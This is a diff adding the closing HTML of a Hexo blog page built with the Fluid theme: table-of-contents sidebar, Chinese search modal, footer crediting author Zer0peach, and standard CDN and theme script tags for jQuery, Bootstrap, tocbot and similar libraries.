+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
